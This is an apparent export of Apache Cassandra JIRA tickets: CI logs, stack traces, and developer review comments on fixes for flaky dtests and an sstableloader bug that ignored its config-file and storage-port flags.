[junit-timeout] INFO  [PerDiskMemtableFlushWriter_0:1] 2022-05-30 16:05:45,167 Flushing.java:145 - Writing Memtable-sstable_activity@215544135(0.422KiB serialized bytes, 54 ops, 13.236KiB (0%) on-heap, 2.008KiB (0%) off-heap), flushed range = [null, null)
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,167 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-TOC.txt
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,167 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-29-big-Summary.db
[junit-timeout] INFO  [PerDiskMemtableFlushWriter_0:2] 2022-05-30 16:05:45,174 Flushing.java:145 - Writing Memtable-sstable_activity_v2@1687505407(0.422KiB serialized bytes, 54 ops, 13.236KiB (0%) on-heap, 1.875KiB (0%) off-heap), flushed range = [null, null)
[junit-timeout] INFO  [PerDiskMemtableFlushWriter_0:2] 2022-05-30 16:05:45,175 Flushing.java:171 - Completed flushing /tmp/cassandra/build/test/cassandra/data/system/sstable_activity_v2-62efe31f3be8310c8d298963439c1288/nb-8-big-Data.db (2.455KiB) for commitlog position CommitLogPosition(segmentId=1653926717793, position=102496)
[junit-timeout] INFO  [PerDiskMemtableFlushWriter_0:1] 2022-05-30 16:05:45,175 Flushing.java:171 - Completed flushing /tmp/cassandra/build/test/cassandra/data/system/sstable_activity-5a1ff267ace03f128563cfae6103c65e/nb-8-big-Data.db (2.588KiB) for commitlog position CommitLogPosition(segmentId=1653926717793, position=102496)
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 LogTransaction.java:242 - Unfinished transaction log, deleting /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Data.db 
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 SSTable.java:127 - Deleting sstable: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Index.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-CompressionInfo.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Statistics.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Digest.crc32
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Filter.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-TOC.txt
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,176 PathUtils.java:74 - Deleting file during startup: /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb-32-big-Summary.db
[junit-timeout] INFO  [NonPeriodicTasks:1] 2022-05-30 16:05:45,177 LogTransaction.java:242 - Unfinished transaction log, deleting /tmp/cassandra/build/test/cassandra/data/system_schema/tables-afddfb9dbc1e30688056eed6c302ba09/nb_txn_compaction_5ccb3290-e032-11ec-8dd1-458238a818cd.log 
[junit-timeout] INFO  [main] 2022-05-30 16:05:45,177 ColumnFamilyStore.java:1010 - Enqueuing flush of cql_test_keyspace.table_07, Reason: UNIT_TESTS, Usage: 0.870KiB (0%) on-heap, 500.164KiB (0%) off-heap
...
{code}
So it seems that the problem is that the failing test is finding more flushes than expected due to the dirty commitlog that is left by the previous tests, particularly those playing with intentionally corrupted data.

The proposed [PR|https://github.com/apache/cassandra/pull/1657] just manually resets the commitlog at the beginning of the tests to get rid of any remains left by previous tests. This approach passes the repeated runs for [j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1656/workflows/f911bcd3-2ce9-4778-81ae-650f964253c4] and [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1656/workflows/c7d673c3-aed6-4a21-8cb6-ba867d319d0d].;;;","01/Jun/22 18:15;brandon.williams;Nice job!  This makes perfect sense and CI looks good, +1.;;;","01/Jun/22 18:16;brandon.williams;It looks like we also need to run this against 4.1.;;;","02/Jun/22 12:01;adelapena;Indeed, and probably also against 4.0. Here are the patches and CI after and before applying the fix:
||PR||CI without patch||CI with patch||
|[4.0|https://github.com/apache/cassandra/pull/1660]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1659/workflows/6c384b4e-f1f8-4825-adaf-927d277e9c05] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1659/workflows/80844337-5701-4461-b809-c2474d6f8be3]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1661/workflows/622c57ae-6db9-4975-808c-fb82f8901d69] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1661/workflows/3f0d0e9e-20a6-4058-adf9-84ca003733de]|
|[4.1|https://github.com/apache/cassandra/pull/1661]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1658/workflows/6200e170-d025-46f9-8472-0fc5a6d47329] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1658/workflows/435c318f-b4ac-49a3-817a-391f27f7a6a8]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1660/workflows/281e2b21-c834-4f80-8cf7-c590655091e2] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1660/workflows/122ceb75-218f-4a30-b08e-da4aefadeae5]|
|[trunk|https://github.com/apache/cassandra/pull/1657]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1641/workflows/7dd9bb59-3e8f-4889-ab84-bcfe4aca6297] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1641/workflows/4c70c9b7-4faa-4877-b874-b89a5d6f3a4a]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1656/workflows/f911bcd3-2ce9-4778-81ae-650f964253c4] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1656/workflows/c7d673c3-aed6-4a21-8cb6-ba867d319d0d]|

Note that I haven't been able to reproduce the test failures on 4.0. I suspect that might be due to the different flushes introduced in 4.1 by CASSANDRA-17034, which often flushes the entire test keyspace instead of the tested column family. Flakiness is quite low so the problem might still be there, but reproducing less frequently. Thus, I think I'd also apply the proposed fix to 4.0. wdyt?;;;","02/Jun/22 14:42;brandon.williams;bq. Thus, I think I'd also apply the proposed fix to 4.0. wdyt?

I think it makes sense to do so, and it certainly won't hurt.  Everything looks good, +1.;;;","06/Jun/22 11:31;adelapena;Thanks for the review.

Committed to {{cassandra-4.0}} as [52f6ac4af91bdda4e177fdfc6342944047ab2e3c|https://github.com/apache/cassandra/commit/52f6ac4af91bdda4e177fdfc6342944047ab2e3c] and merged to [{{cassandra-4.1}}|https://github.com/apache/cassandra/commit/5875cbe839f4b5bd8df9a01d7e1b703449a8fd3d] and [{{trunk}}|https://github.com/apache/cassandra/commit/3a55e0cbd0ac8174a8e231e39cc928c4e597e5ba].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl,CASSANDRA-17606,13443480,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,e.dimitrova,e.dimitrova,05/May/22 23:01,27/May/22 19:25,13/Jul/23 08:40,13/May/22 12:10,4.0.5,4.1,4.1-alpha1,,,,CI,,,,0,,"[https://ci-cassandra.apache.org/job/Cassandra-trunk/1126/testReport/dtest-upgrade.upgrade_tests.upgrade_through_versions_test/TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD/test_rolling_upgrade_with_internode_ssl/]

Failed twice on trunk. 
h3.  
{code:java}
Error Message
test teardown failure

Stacktrace
Unexpected error found in node logs (see stdout for full details). Errors: [WARN [MessagingService-Incoming-/127.0.0.2] 2022-05-03 21:37:48,446 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing org.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles. If the table was just created, this is likely due to the schema not being fully propagated. Please wait for schema agreement on table creation. at org.apache.cassandra.db.SliceFromReadCommandSerializer.deserialize(SliceFromReadCommand.java:184) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:158) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:132) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.MessageIn.read(MessageIn.java:99) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:200) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:177) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:91) ~[apache-cassandra-2.2.19.jar:2.2.19], WARN [MessagingService-Incoming-/127.0.0.2] 2022-05-03 21:37:48,446 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing org.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles. If the table was just created, this is likely due to the schema not being fully propagated. Please wait for schema agreement on table creation. at org.apache.cassandra.db.SliceFromReadCommandSerializer.deserialize(SliceFromReadCommand.java:184) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:158) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.db.ReadCommandSerializer.deserialize(ReadCommand.java:132) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.MessageIn.read(MessageIn.java:99) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.receiveMessage(IncomingTcpConnection.java:200) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.receiveMessages(IncomingTcpConnection.java:177) ~[apache-cassandra-2.2.19.jar:2.2.19] at org.apache.cassandra.net.IncomingTcpConnection.run(IncomingTcpConnection.java:91) ~[apache-cassandra-2.2.19.jar:2.2.19]]
{code}
 ",,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17299,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 13 12:10:23 UTC 2022,,,,,,,All,,,,"0|z12428:",9223372036854775807,,,,bereng,e.dimitrova,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/918c0a60382d5c8028a43452c6070683e205450e,,,,,,,,,run CI,,,,,"12/May/22 08:18;bereng;Marking as duplicate of CASSANDRA-17299 as I noticed the recent failures, the only we have logs for, match in both tickets.;;;","12/May/22 22:25;brandon.williams;I've got a [branch|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17606] that adds a wait for schema agreement at the end of both schema creation calls, and it has a run in [jenkins|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1705/] and 100 in [circle|https://app.circleci.com/pipelines/github/driftx/cassandra/482/workflows/67c88777-35b9-4931-ac5a-93d6c321aa1a/jobs/5561] passed.  While we don't yet have a way to multiplex a test in Jenkins, in practice I was able to reproduce this before the patch and am unable after, so I don't think this was _just_ an environmental thing.  Regardless, waiting for schema agreement is the correct thing to do and perhaps what [this|https://github.com/apache/cassandra-dtest/blob/trunk/upgrade_tests/upgrade_through_versions_test.py#L388] is trying to accomplish.
;;;","12/May/22 22:36;e.dimitrova;So this new call raises the wait time from 5 to 15s? Looking at max_schema_agreement_wait and considering the sleep is still there. 

Wondering whether we want to remove then the sleep?;;;","12/May/22 22:55;brandon.williams;Yes, it's at most 15s since it's not blindly sleeping.  As for removing the blind sleep, let's try it: [jenkins|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1706/] and [circle|https://app.circleci.com/pipelines/github/driftx/cassandra/483/workflows/8a852510-8a8e-4c67-9613-159d6c7659d2/jobs/5563] are queued up.;;;","12/May/22 23:01;e.dimitrova;Yup, that's what I meant, at most.

I am not against, just wondering whether it makes sense to make it more clear. Also, it seems 10 was considered reasonable.

Let's see;;;","13/May/22 05:43;bereng;Waiting for schema agreement is the right thing regardless as Brandon says +1. In fact someday we should add a mandatory flag when issuing a command given how many flaky tests we've hit on these grounds. LGTM +1, let's merge it imo as being part of the upgrade matrix this should be a noisy test and we'll kill a few flakies with one stone :-);;;","13/May/22 10:19;e.dimitrova;+1;;;","13/May/22 12:10;brandon.williams;Committed, thanks folks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix dtest-offheap.materialized_views_test.TestMaterializedViews.test_mv_with_default_ttl_with_flush,CASSANDRA-17605,13443476,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,e.dimitrova,e.dimitrova,05/May/22 22:44,09/Sep/22 21:43,13/Jul/23 08:40,12/May/22 10:30,4.1,4.1-alpha1,,,,,CI,,,,0,,"h3.  

https://ci-cassandra.apache.org/job/Cassandra-4.1/5/testReport/dtest-offheap.materialized_views_test/TestMaterializedViews/test_mv_with_default_ttl_with_flush_2/
{code:java}
Error Message
AssertionError: Expected [[1, 6, 1]] from SELECT * FROM t, but got [[1, None, 1]]

Stacktrace
self = <materialized_views_test.TestMaterializedViews object at 0x7f8b1fd21cd0> @since('3.0') def test_mv_with_default_ttl_with_flush(self): > self._test_mv_with_default_ttl(True) materialized_views_test.py:1320: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ materialized_views_test.py:1416: in _test_mv_with_default_ttl assert_one(session, ""SELECT * FROM t"", [1, 6, 1]) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ session = <cassandra.cluster.Session object at 0x7f8b1f167f70> query = 'SELECT * FROM t', expected = [1, 6, 1], cl = None def assert_one(session, query, expected, cl=None): """""" Assert query returns one row. @param session Session to use @param query Query to run @param expected Expected results from query @param cl Optional Consistency Level setting. Default ONE Examples: assert_one(session, ""LIST USERS"", ['cassandra', True]) assert_one(session, query, [0, 0]) """""" simple_query = SimpleStatement(query, consistency_level=cl) res = session.execute(simple_query) list_res = _rows_to_list(res) > assert list_res == [expected], ""Expected {} from {}, but got {}"".format([expected], query, list_res) E AssertionError: Expected [[1, 6, 1]] from SELECT * FROM t, but got [[1, None, 1]] tools/assertions.py:132: AssertionError
{code}
 ",,adelapena,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17882,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu May 12 10:23:02 UTC 2022,,,,,,,All,,,,"0|z1241c:",9223372036854775807,,,,adelapena,,,,Normal,,4.0.4,,https://github.com/apache/cassandra-dtest/commit/9092c68f0c3d5ee6152471c8bbd499c8e5657378,,,,,,,,,See PR,,,,,"06/May/22 08:43;bereng;The problem seemed to be TTL expiring. It can be reproed easily locally by setting TTL to 1. The fix is to check if TTL has expired hence the assert doesn't apply.;;;","09/May/22 05:44;bereng;Moving this to urgent as it was seen on the 4.1 branch.;;;","10/May/22 12:49;adelapena;Looks good overall, here are repeated CI runs for all involved branches:
||Branch||CI||
|3.0|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1528/workflows/33c5bc80-ff45-4172-be5c-a33735545d38]|
|3.11|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1530/workflows/c66b8d14-a2d4-4f0e-98e9-052a29c5816b]|
|4.0|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1529/workflows/fa0ea980-dc10-4ec1-88fd-9548d3af7515] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1529/workflows/6d9fcc35-689b-4a74-8799-ec7a23d69e1a]|
|4.1|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1532/workflows/321b76e2-92a1-44bb-98c3-95f5cefb42f1] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1532/workflows/c9bca385-b757-45a7-87ed-bf87ca438bad]|
|trunk|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1531/workflows/c179ef60-4d3b-4ab7-bbff-1b4663901b68] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1531/workflows/b7f08bf6-df70-4f85-bffa-a99970d3b492]|

The suggested changes ignore the read failures if each block of operations takes longer than the TTL. If that happens we wouldn't have managed to properly test the desired operations due to env conditions, so IMO the test would be inconclusive. It might make sense to just skip the test if we find such scenario:
{code:python}
except AssertionError as ae:
    if (time.time() - start) < 50:
        raise ae
    else:
        pytest.skip(""Skipping test because it took longer than the 50s TTL"")
{code}
 Or we might continue without immediately skipping the test but just setting a boolean signalling that some check has failed and, at the end of the test, consider it skipped:
{code:python}
except AssertionError as ae:
    if (time.time() - start) < 50:
        raise ae
    else:
        skipped = True
...
if skipped:
    pytest.skip(""Skipping test because some checks took longer than their specified TTL, ""
                ""probably due to an unusually slow environment"")
{code}
Also, it could be useful to increase the TTLs to reduce the likelihood of that problematic scenario. Currently we use TTLs of 50, 40 and 30 seconds, we could for example use 100, 90 and 80 seconds.
 ;;;","10/May/22 13:09;adelapena;Thinking it again, it might be a better idea to just increase the TTLs and use the {{@flaky}} annotation to just repeat the test a number of times until it succeeds. We could keep the current catching of exceptions and time check to throw a custom exception when the checks fail due to a slow environment. Then we would use a [{{rerun_filter}}|https://github.com/box/flaky/blob/master/flaky/flaky_decorator.py#L18-L30] to only repeat the test if it has failed in the expected conditions, similarly to what is done with [{{test_failure_due_to_timeout}}|https://github.com/apache/cassandra-dtest/blob/trunk/dtest.py#L202-L231]. That way we would be giving more time to the slow environment instead of just skipping the tests. wdyt?;;;","11/May/22 06:30;bereng;[~adelapena] thanks for your feedback. In fact it trigerred me to push what I believe is an overall better solution: If TTL expires fail the test asking the user to bump TTL again. That way it's deterministic and crystal clear what the problem and the solution are. Wdyt?

I didn't test all branches as the behavior of the test didn't change. Let's see how CI goes [this time|https://app.circleci.com/pipelines/github/bereng/cassandra/655/workflows/badbea6a-00e2-40ed-aacf-89b491229d0a/jobs/5952];;;","11/May/22 11:28;adelapena;Increasing TTLs and throwing a clear test error message also works for me, that's better that just ignoring the checks. If it fails again we can go back and either further increase the TTLs or add a more robust retry policy.;;;","11/May/22 13:22;bereng;Is that a +1 to merge? :-);;;","11/May/22 14:27;adelapena;It is, once we fix the four inequalities commented on the PR, so we don't intercept a legitimate assertion error while we are still within the TTL. I would also start either a full run of dtests or a separate repeated run of {{{}test_mv_with_default_ttl_without_flush{}}}, since the latter is also a caller of the modified {{{}_test_mv_with_default_ttl{}}}.

Note that the provided test repetitions on CircleCI are useful to verify that we haven't inadvertently introduced a new failure, but they aren't able to reproduce the original failure conditions. This is shown by [this successful run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1533/workflows/1f6ab942-7b4a-4be9-959f-483700c3aea1] of {{test_mv_with_default_ttl_with_flush}} against an unpatched dtest repo. We could try to increase the number of repetitions, but I doubt that we are going to be able to reproduce the original slow env conditions on Circle. Probably this is a Jenkins-only issue.;;;","12/May/22 05:58;bereng;Hi [~adelapena]: Inequalities changed, I included a full dtests run + a repeated run of the other test and the best repro of the original issue we have is the ones I did locally which matched the original stack traces. I think this is everything we need?;;;","12/May/22 10:19;adelapena;Looks good to me +1. There are a couple of unrelated test failures on [the provided CI run|https://app.circleci.com/pipelines/github/bereng/cassandra/656/workflows/ef05cbed-9c9f-4451-8f96-9ad7f9a441eb] that are due to the dtest branch missing CASSANDRA-17456. After rebasing [this new run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1541/workflows/9e376d6d-6b8c-410f-a2c9-81afa3c796dd] looks as green as a four-leaved-clover. Same for [trunk|https://app.circleci.com/pipelines/github/adelapena/cassandra/1542/workflows/1514ce71-00a3-4940-92f6-4e2c6d9eb044]. I think we're ready to commit.;;;","12/May/22 10:23;bereng;bq. looks as green as a four-leaved-clover

:-DDD;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sstableloader not respecting conf-path flag,CASSANDRA-17602,13443383,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,aswinkarthik,aswinkarthik,05/May/22 12:54,05/Oct/22 22:22,13/Jul/23 08:40,16/Jun/22 17:49,4.0.5,4.1-beta1,5.0,,,,Tool/bulk load,,,,0,,"Hello,

sstableloader does not seem to respect the config file flag (-f) and the storage port flag.

 

We run our cluster on a different storage port with encryption. We construct a YAML with {{server_encryption_options}} and {{client_encryption_options}} and pass the storage port flag (both {{-sp}} and {{-ssp}}).

 

However, we noticed that both the storage port flag and encryption settings are getting picked from the default config file {{conf/cassandra.yaml}} and ends up connecting to 7000 port unencrypted. As a workaround, we have added the storage port configuration to the YAML and copy our configuration file and overwrite the {{conf/cassandra.yaml}} and it is working now.

 

Also to be noted that using the {{-f}} works in Cassandra 3.x. The bug seems to be present in 4.x versions only.",,aswinkarthik,e.dimitrova,jmckenzie,jonmeredith,smiklosovic,,,,,,,,,,"smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r874957067


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -28,26 +28,24 @@
 
 public class BulkLoadConnectionFactory extends DefaultConnectionFactory implements StreamConnectionFactory
 {
-    // TODO: what is this unused variable for?
-    private final boolean outboundBindAny;
-    private final int secureStoragePort;
+    private final int storagePort;
     private final EncryptionOptions.ServerEncryptionOptions encryptionOptions;
 
-    public BulkLoadConnectionFactory(int secureStoragePort, EncryptionOptions.ServerEncryptionOptions encryptionOptions, boolean outboundBindAny)
+    public BulkLoadConnectionFactory(EncryptionOptions.ServerEncryptionOptions encryptionOptions, int storagePort)
     {
-        this.secureStoragePort = secureStoragePort;
+        this.storagePort = storagePort;

Review Comment:
   we need to acutally propagate storagePort, this comes from the cli of sstableloader.



;17/May/22 15:20;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r874957521


##########
src/java/org/apache/cassandra/tools/BulkLoadConnectionFactory.java:
##########
@@ -28,26 +28,24 @@
 
 public class BulkLoadConnectionFactory extends DefaultConnectionFactory implements StreamConnectionFactory
 {
-    // TODO: what is this unused variable for?
-    private final boolean outboundBindAny;
-    private final int secureStoragePort;
+    private final int storagePort;
     private final EncryptionOptions.ServerEncryptionOptions encryptionOptions;
 
-    public BulkLoadConnectionFactory(int secureStoragePort, EncryptionOptions.ServerEncryptionOptions encryptionOptions, boolean outboundBindAny)
+    public BulkLoadConnectionFactory(EncryptionOptions.ServerEncryptionOptions encryptionOptions, int storagePort)
     {
-        this.secureStoragePort = secureStoragePort;
+        this.storagePort = storagePort;
         this.encryptionOptions = encryptionOptions;
-        this.outboundBindAny = outboundBindAny;
     }
 
     public Channel createConnection(OutboundConnectionSettings template, int messagingVersion) throws IOException
     {
-        // Connect to secure port for all peers if ServerEncryptionOptions is configured other than 'none'
-        // When 'all', 'dc' and 'rack', server nodes always have SSL port open, and since thin client like sstableloader
-        // does not know which node is in which dc/rack, connecting to SSL port is always the option.
+        // storage port can handle both encrypted and unencrypted traffic from 4.0
+        // so from sstableloader's point of view we can use just storage port for both cases
+
+        template = template.withConnectTo(template.to.withPort(storagePort));
 
         if (encryptionOptions != null && encryptionOptions.internode_encryption != EncryptionOptions.ServerEncryptionOptions.InternodeEncryption.none)

Review Comment:
   we fill template with encryptionOptions if there are any



;17/May/22 15:21;githubbot;600","driftx commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876199710


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   This doesn't make sense, the driver doesn't connect to the storage port.



;18/May/22 18:11;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876689784


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   @driftx this code belongs to the test method `bulkLoaderCannotAgreeOnClientTLSProtocol` which specified `--ssl-protocol` to be `TLSv1` which is invalid as in config it is `TLSv1.2` for _client_ encryption. Bulkloader internally connects via CQL to a node, fetching metadata, getting token ranges so on before actually loading sstables. So this exception comes from the fact that we have not been able to talk to that node via CQL because we have set invalid `--ssl-protocol` flag. Basically, if fails way sooner it gets to sstable loading.



;19/May/22 07:17;githubbot;600","smiklosovic commented on code in PR #1632:
URL: https://github.com/apache/cassandra/pull/1632#discussion_r876689784


##########
test/distributed/org/apache/cassandra/distributed/test/SSTableLoaderEncryptionOptionsTest.java:
##########
@@ -112,7 +113,7 @@ public void bulkLoaderCannotAgreeOnClientTLSProtocol()
                                                             ""--truststore-password"", validTrustStorePassword,
                                                             ""test/data/legacy-sstables/na/legacy_tables/legacy_na_clust"");
         assertNotEquals(0, tool.getExitCode());
-        assertTrue(tool.getStdout().contains(""SSLHandshakeException""));
+        assertTrue(tool.getStdout().contains(""com.datastax.driver.core.exceptions.TransportException""));

Review Comment:
   @driftx this code belongs to the test method `bulkLoaderCannotAgreeOnClientTLSProtocol` which specified `--ssl-protocol` to be `TLSv1` which is invalid as in config it is `TLSv1.2` for _client_ encryption. Bulkloader internally connects via CQL to a node, fetching metadata, getting token ranges and so on before actually loading sstables. So this exception comes from the fact that we have not been able to talk to that node via CQL because we have set invalid `--ssl-protocol` flag. Basically, if fails way sooner it gets to sstable loading.



;19/May/22 07:18;githubbot;600","smiklosovic commented on code in PR #1632:
